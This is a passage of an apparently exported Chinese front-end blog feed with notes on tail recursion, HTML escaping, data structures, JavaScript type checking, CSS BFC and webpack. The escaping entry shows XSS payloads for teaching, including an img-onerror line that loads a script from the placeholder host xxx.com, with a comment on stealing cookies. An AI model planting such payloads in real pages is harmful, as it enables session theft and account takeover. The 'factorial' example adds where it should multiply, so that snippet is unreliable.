<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 尾递归</span><br><span class="line">function factorial(num, total) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return total</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return factorial(num - 1, num + total)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(100000)</span><br><span class="line">// 此时依然会栈溢出！！！：Maximum call stack size exceeded</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询后发现各大浏览器（除了safari）根本就没部署尾调用优化，因为尾调用优化依旧有隐式优化（函数是否符合尾调用而被消除了尾递归很难被开发员自己辨别）和调用栈丢失的问题。</p>
</li>
<li><p>node 低版本中本中可以开启尾递归如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// node 6.6.0 版本通过指定参数开启：</span><br><span class="line">// PTC.js</span><br><span class="line">&apos;use strict&apos;;</span><br><span class="line">function f(n, sum = 1) &#123;</span><br><span class="line">    if (n &lt;= 1) &#123;</span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line">    return f(n - 1, sum + n);</span><br><span class="line">&#125;</span><br><span class="line">const result = f(100000);</span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">$node --harmony_tailcalls PTC.js  // 5000050000</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Question]]></title>
      <url>https://fuzhongfeng.github.io/2019/08/20/questions-1/</url>
      <content type="html"><![CDATA[<h1 id="开发常见问题"><a href="#开发常见问题" class="headerlink" title="开发常见问题"></a>开发常见问题</h1><hr>
<h2 id="1-html转义问题"><a href="#1-html转义问题" class="headerlink" title="1. html转义问题"></a>1. html转义问题</h2><h3 id="dom-上的属性被-转义："><a href="#dom-上的属性被-转义：" class="headerlink" title="dom 上的属性被$()转义："></a>dom 上的属性被$()转义：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;&lt;div data-comment=&quot;&#123;&amp;quot;title&amp;quot;:&amp;quot;重难点&amp;quot;,&amp;quot;background&amp;quot;:&amp;quot;rgb(240, 149, 82)&amp;quot;,&amp;quot;icon_src&amp;quot;:&amp;quot;/system/images/171025215642____.png&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&amp;quot;&#125;&quot;&gt;&lt;/div&gt;&apos;)</span><br><span class="line"></span><br><span class="line">// 将div标签上的 data-comment 属性转义后的值如下：</span><br><span class="line">nodeValue: &quot;&#123;&quot;title&quot;:&quot;重难点&quot;,&quot;background&quot;:&quot;rgb(240, 149, 82)&quot;,&quot;icon_src&quot;:&quot;/system/images/171025215642____.png&quot;,&quot;content&quot;:&quot;11111&lt;br &gt;&lt;/div&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;&#125;&quot; </span><br><span class="line">// 明显多出来一个&lt;/div&gt;啊</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解决办法</p>
<ol>
<li>lodash 的 escape 和 unescape(推荐)</li>
</ol>
<ul>
<li>_.escape：转换字符串中的 <code>&quot;&amp;&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &#39;&quot;&#39;, &quot;&#39;&quot;</code> 为HTML的响应实体字符，没有其他多余的字符被转义。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.escape(&apos;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&apos;)</span><br><span class="line">// &quot;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<ul>
<li><p>_.usescape：转换字符串中的实体字符 <code>&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;</code> 为响应的 HTML 字符。与escape中的字符一一对应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.unescape(&apos;11111&amp;lt;br /&amp;gt;22222&amp;lt;br /&amp;gt;33333&amp;lt;br /&amp;gt;44444&amp;lt;br /&amp;gt;&apos;)</span><br><span class="line">// &quot;11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果不反转义直接放到dom中呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器会反转义一次字符串，结果展示到页面上：</span><br><span class="line">11111&lt;br /&gt;22222&lt;br /&gt;33333&lt;br /&gt;44444&lt;br /&gt; // 纯字符串</span><br></pre></td></tr></table></figure>
</li>
<li><p>当在浏览器控制台选中dom后，右键选择：”Edit as HTML”后，展示的输入框内容相当于进行了一次 escape，确定输入后又进行了一次 unescape, HTML 中的预留字符必须被替换为字符实体。</p>
</li>
</ul>
<ol start="2">
<li>利用 jquery<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// HTML标签转义（&lt; 转为 &amp;lt;）</span><br><span class="line">function html2Escape(sHtml) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).text(sHtml).html();</span><br><span class="line">&#125;</span><br><span class="line">// HTML标签反转义（&amp;lt; 转为 &lt;）</span><br><span class="line">function escape2Html(str) &#123;</span><br><span class="line">  return $(&quot;&lt;div/&gt;&quot;).html(str).text();</span><br><span class="line">&#125;</span><br><span class="line">// 此方法在反转义的时候会将形如：1&lt;br &gt;&lt;/div&gt;2&lt;br /&gt;3&lt;br /&gt;的内容反转为123</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="除了被-转义外，其他情况有哪些呢？"><a href="#除了被-转义外，其他情况有哪些呢？" class="headerlink" title="除了被 $() 转义外，其他情况有哪些呢？"></a>除了被 $() 转义外，其他情况有哪些呢？</h3><ol>
<li>XSS 攻击<br>在浏览器上随便选择一个 dom，控制台执行如下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$0.innerHTML=&quot;&lt;img src=@ onerror=alert(1)&gt;&quot; // alert(1)</span><br><span class="line"></span><br><span class="line">$0.innerHTML = &quot;&lt;img src=@ onerror=&apos;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;https://xxx.com/xx.js\&quot;;document.body.appendChild(s);&apos; /&gt;&quot;</span><br><span class="line">// 代码中引入了一个第三方的脚本，这样做的事情就多了，从取你的 cookie，发送到黑客自己的服务器，到监听你的输入，到发起 CSRF 攻击，直接以你的身份调用网站的各种接口等</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> Question </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Question </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据结构]]></title>
      <url>https://fuzhongfeng.github.io/2019/07/05/data-structure/</url>
      <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><blockquote>
<p>概念：队列是一种线性结构，特点是在某一端添加数据，在另一端删除数据，遵循先进先出的原则。</p>
</blockquote>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><ol>
<li>单链队列<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Queue &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.queue = []</span><br><span class="line">    &#125;</span><br><span class="line">    enQueue(item) &#123;</span><br><span class="line">        this.queue.push(item)</span><br><span class="line">    &#125;</span><br><span class="line">    deQueue() &#123;</span><br><span class="line">        return this.queue.shift()</span><br><span class="line">    &#125;</span><br><span class="line">    getHeader() &#123;</span><br><span class="line">        return this.queue[0]</span><br><span class="line">    &#125;</span><br><span class="line">    getLength() &#123;</span><br><span class="line">        return this.queue.length</span><br><span class="line">    &#125;</span><br><span class="line">    isEmpty() &#123;</span><br><span class="line">        return this.getLength() === 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>单链队列的出队操作的时间复杂度为O(n), 然而循环队列的出队操作的时间复杂度为O(1)</p>
<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><blockquote>
<p>树里的每一个节点有一个值和一个包含所有子节点的列表。从图的观点来看，树也可视为一个拥有 N 个节点和 N-1 条边的一个有向无环图。</p>
</blockquote>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><blockquote>
<p>是一种更为典型的树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。</p>
</blockquote>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>前中后序都是只根节点的顺序</p>
<ul>
<li><p>前序遍历</p>
<blockquote>
<p>前序遍历首先访问根节点，然后遍历左子树，最后遍历右子树。</p>
</blockquote>
</li>
<li><p>中序遍历</p>
<blockquote>
<p>中序遍历是先遍历左子树，然后访问根节点，然后遍历右子树。</p>
</blockquote>
</li>
<li><p>后序遍历</p>
<blockquote>
<p>后序遍历是先遍历左子树，然后遍历右子树，最后访问树的根节点。</p>
</blockquote>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Data Structure And Algorithm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Data Structure And Algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-类型判断]]></title>
      <url>https://fuzhongfeng.github.io/2019/03/08/2019-3-8-javascript-typeJudge/</url>
      <content type="html"><![CDATA[<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><blockquote>
<p>说到 javascript 中的类型判断方法有很多。如 typeof、instanceof、Array.isArray()、Object.prototype.toString.call()，下面会详细讲解优缺点及具体用法以及最佳方案。</p>
</blockquote>
<h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><blockquote>
<p>typeof 适用于检测基本数据类型</p>
</blockquote>
<ul>
<li><p>typeof 操作符可能返回下列字符串:<br>“undefined”——如果这个值未定义<br>“boolean”——如果这个值是布尔值<br>“string”——如果这个值是字符串<br>“number”——如果这个值是数值<br>“object”——如果这个值是对象或null<br>“function”——如果这个值是函数</p>
</li>
<li><p>看下面的返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typeof [] // &quot;object&quot;</span><br><span class="line">typeof new Date() // &quot;object&quot;</span><br><span class="line">typeof new RegExp() // &quot;object&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><blockquote>
<p>instanceof 适用于检测引用类型的值，如果构造函数的prototype属性在实例的原型链中出现过则返回true。</p>
</blockquote>
<ul>
<li><p>如果变量 variable 是引用类型 constructor 的实例，则返回 true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable instanceof constructor;</span><br></pre></td></tr></table></figure>
</li>
<li><p>看下面的返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] instanceof Array // true</span><br></pre></td></tr></table></figure>
</li>
<li><p>但如果不在同一个全局环境中执行，instanceof 就不能正常使用，因为不同的全局环境下的构造函数时不同的。看下面的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// index.html 文件</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;iframe src=&quot;./inner.html&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        var arr = [1, 2, 3];</span><br><span class="line">        var f = function() &#123;&#125;</span><br><span class="line">        window.frames[0].func(arr, f);</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(window.Array === window.frames[0].Array) // false</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">// inner.html</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var func = function(arr, f) &#123;</span><br><span class="line">            console.log(arr instanceof Array) // false</span><br><span class="line">            console.log(f instanceof Function) // false</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li>这里可以关于数组的判断可以使用 Array.isArray() 来判断。支持浏览器的方法有 IE9+、Firefox4+、Safari5+、Opera10.5+、chrome。</li>
<li>从父级中传入的函数 f 无法判断。</li>
</ol>
<h3 id="最佳方案-Object-prototype-toString-call"><a href="#最佳方案-Object-prototype-toString-call" class="headerlink" title="最佳方案 Object.prototype.toString.call()"></a>最佳方案 Object.prototype.toString.call()</h3><blockquote>
<p>在任何值上调用 Object 原生的方法 toString() 方法，都会返回一个[object NativeConstructorName]格式的字符串。每个类在内部都有一个[[Class]]属性，这个属性中就指定了上述字符串中的构造函数名。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// 字符串</span><br><span class="line">Object.prototype.toString.call(&apos;a&apos;) // &quot;[object String]&quot;</span><br><span class="line">// 数字</span><br><span class="line">Object.prototype.toString.call(1) // &quot;[object Number]&quot;</span><br><span class="line">// Boolean</span><br><span class="line">Object.prototype.toString.call(true) // &quot;[object Boolean]&quot;</span><br><span class="line">// undefined </span><br><span class="line">Object.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;</span><br><span class="line">// null</span><br><span class="line">Object.prototype.toString.call(null) // &quot;[object Null]&quot;</span><br><span class="line">// Symbol</span><br><span class="line">Object.prototype.toString.call(Symbol()) // &quot;[object Symbol]&quot;</span><br><span class="line">// 数组</span><br><span class="line">Object.prototype.toString.call([]) // &quot;[object Array]&quot;</span><br><span class="line">// 对象</span><br><span class="line">Object.prototype.toString.call(&#123;&#125;) // &quot;[object Object]&quot;</span><br><span class="line">// 函数</span><br><span class="line">Object.prototype.toString.call(function() &#123;&#125;) // &quot;[object Function]&quot;</span><br><span class="line">// RegExp</span><br><span class="line">Object.prototype.toString.call(/a/) // &quot;[object RegExp]&quot;</span><br><span class="line">// Date</span><br><span class="line">Object.prototype.toString.call(new Date()) // &quot;[object Date]&quot;</span><br><span class="line">// Map</span><br><span class="line">Object.prototype.toString.call(new Map()) // &quot;[object Map]&quot;</span><br><span class="line">// Set</span><br><span class="line">Object.prototype.toString.call(new Set()) // &quot;[object Set]&quot;</span><br><span class="line">// Math</span><br><span class="line">Object.prototype.toString.call(Math) // &quot;[object Math]&quot;</span><br><span class="line">// JSON</span><br><span class="line">Object.prototype.toString.call(JSON) // &quot;[object JSON]&quot;</span><br><span class="line">// Error</span><br><span class="line">Object.prototype.toString.call(new Error()) // &quot;[object Error]&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>兼容性也很好：Edge12+、Firefox1+、Firefox for Android4+、及其他浏览器</li>
</ul>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS-BFC]]></title>
      <url>https://fuzhongfeng.github.io/2019/02/17/css-bfc/</url>
      <content type="html"><![CDATA[<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><blockquote>
<p>BFC(Block Formatting Context)是 Web 页面中盒模型布局的 CSS 渲染模式，它的定位体系属于常规文档流。</p>
</blockquote>
<h4 id="创建-BFC"><a href="#创建-BFC" class="headerlink" title="创建 BFC"></a>创建 BFC</h4><ul>
<li>根元素，即 HTML 元素</li>
<li>float 的值不为 none</li>
<li>overflow 的值不为 visible</li>
<li>display 的值为 inline-block、table-cell、table-caption</li>
<li>position 的值为 absolute 或 fixed</li>
</ul>
<h4 id="BFC-特性"><a href="#BFC-特性" class="headerlink" title="BFC 特性"></a>BFC 特性</h4><ul>
<li>内部的 Box 会在垂直方向，从顶部开始一个接一个地放置</li>
<li>Box 垂直方向的距离由 margin 决定。属于同一个 BFC 的两个相邻 Box 的 margin 会发生叠加</li>
<li>每个元素的 margin box 的左边， 与包含块 border box 的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此</li>
<li>BFC 的区域不会与 float box 叠加<br>例子：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--下面是css代码--&gt;</span><br><span class="line"> .aside &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 150px;</span><br><span class="line">    float: left;</span><br><span class="line">    background: #f66;</span><br><span class="line">  &#125;</span><br><span class="line">  .main &#123;</span><br><span class="line">    height: 200px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    background: #fcc;</span><br><span class="line">  &#125;</span><br><span class="line">  .text&#123;</span><br><span class="line">    width: 500px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;div class=&quot;aside&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;text&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;main&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">// 不添加 overflow: hidden 时会出现叠加的情况，加上之后不会再叠加</span><br></pre></td></tr></table></figure>
<ul>
<li>BFC 就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然</li>
<li>计算 BFC 的高度时，浮动元素也参与计算</li>
</ul>
<h4 id="BFC-的作用"><a href="#BFC-的作用" class="headerlink" title="BFC 的作用"></a>BFC 的作用</h4><ul>
<li>分属于不同的BFC时可以阻止 margin 重叠</li>
<li>可以阻止元素被浮动元素覆盖</li>
<li>通过定义一个 BFC 可以解决容器中由于存在浮动元素而导致的脱离常规文档流问题</li>
<li>使用 BFC 防止文字环绕，看下面的例子：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .container &#123;</span><br><span class="line">      height: 300px;</span><br><span class="line">      width: 300px;</span><br><span class="line">      background: red;</span><br><span class="line">    &#125;</span><br><span class="line">    .floated &#123;</span><br><span class="line">      height: 100px;</span><br><span class="line">      width: 100px;</span><br><span class="line">      background: green;</span><br><span class="line">      float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .bfc &#123;</span><br><span class="line">      overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;floated&quot;&gt;浮动的div&lt;/div&gt;</span><br><span class="line">    &lt;p class=&quot;bfc&quot;&gt;</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">// 不加上 bfc class 文字将围绕在浮动的 div 周围，加上 bfc class 之后 文字将不会环绕</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CSS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Webpack4]]></title>
      <url>https://fuzhongfeng.github.io/2019/01/24/2019-1-28-webpack/</url>
      <content type="html"><![CDATA[<h1 id="webpack-学习笔记"><a href="#webpack-学习笔记" class="headerlink" title="webpack 学习笔记"></a>webpack 学习笔记</h1><h2 id="Html-插件"><a href="#Html-插件" class="headerlink" title="Html 插件"></a>Html 插件</h2><ol>
<li>根据模板在打包时自动生成 html 文件，使用 htmlWebpackPlugin 插件可以配置入口 html 模板和在引入的 js 文件上加 hash</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">        template: &apos;./src/index.html&apos;,</span><br><span class="line">        filename: &apos;index.html&apos;,</span><br><span class="line">        minify: &#123; // 将 build 后的 html 文件压缩</span><br><span class="line">            collapseWhiteSpace: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        hash: true // 在 html 的 script 标签引入的 js 中加 hash，如: &quot;build.js?0b2a9l&quot; 防止缓存</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 第二种在 output 中配置</span><br><span class="line">output: &#123;</span><br><span class="line">    filename: &apos;bundle.[hash:8].js&apos; // 此方法每次回生成不同的文件防止缓存，但实际使用中也会出现一定的问题，如上线之后用户会出现访问不到文件的 404 的情况</span><br><span class="line">    // &apos;bundle.js?[hash:8]&apos; 可以防止缓存，又可以避免上线之后用户浏览器缓存引起的文件 404 的情况</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>webpack-dev-server 生成一个内存中的打包文件</li>
</ol>
<h2 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h2><p>webpack 是内置的通过 express 启动的静态服务，好处是并不会真是的打包文件，而是在内存中打包，并生成一个本地地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 开发服务器的配置</span><br><span class="line">devServer: &#123;</span><br><span class="line">    port: 3000, // 开发服务本地端口</span><br><span class="line">    progress: true, // 添加进度条</span><br><span class="line">    contentBase: &apos;./build&apos;, // 指定 build 作为静态服务</span><br><span class="line">    open: true, // 自动打开网页</span><br><span class="line">    compress: true, // 压缩</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="webpack-跨域问题"><a href="#webpack-跨域问题" class="headerlink" title="webpack 跨域问题"></a>webpack 跨域问题</h2><ol>
<li>使用 webpack-dev-server 解决，当前端出现跨域时可以通过 node 服务来进行转发</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    //(1) 通过重写的方式 把请求代理到 express 服务器上, 配置了一个代理，将 api 的请求转发到 3000</span><br><span class="line">    proxy: &#123;</span><br><span class="line">        &apos;/api&apos;: &#123;</span><br><span class="line">            target: &apos;http://localhost:3000&apos;,</span><br><span class="line">            pathRewrite: &#123;</span><br><span class="line">                &apos;/api&apos;: &apos;&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //(2) 前端只想单纯来模拟数据</span><br><span class="line">    before() &#123;</span><br><span class="line">        app.get(&apos;/user&apos;, (req. res) =&gt; &#123;</span><br><span class="line">            res.json(&#123;</span><br><span class="line">                name: &apos;mock 数据&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//(3) 有服务端，不用代理来处理 ，在服务端启动 webpack 端口用服务端端口</span><br><span class="line">// server.js 文件</span><br><span class="line">// 使用 webpack-dev-middleware 在服务端启动 webpack</span><br><span class="line">let middle = require(&apos;webpack-dev-middleware&apos;)</span><br><span class="line">let config = require(&apos;webpack.config.js&apos;)</span><br><span class="line">let webpack = require(&apos;webpack&apos;)</span><br><span class="line">let compiler = webpack(config)</span><br><span class="line">app.use(middle(compiler))</span><br></pre></td></tr></table></figure>
<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><ol>
<li>loader 默认从右向做、从下到上处理</li>
<li>style-loader: 将 style 中的 css 变成 link 方式引入，避免阻塞</li>
<li>css-loader: 可以支持 css import 语法</li>
<li>less-loader: 可以将 less 转为 css</li>
<li>pre loader、内联 loader（直接可以再代码中使用的）、normal loader、后置 postloader</li>
</ol>
<h2 id="es-语法转换"><a href="#es-语法转换" class="headerlink" title="es 语法转换"></a>es 语法转换</h2><ol>
<li>babel-loader babel/core babel/preset-env</li>
</ol>
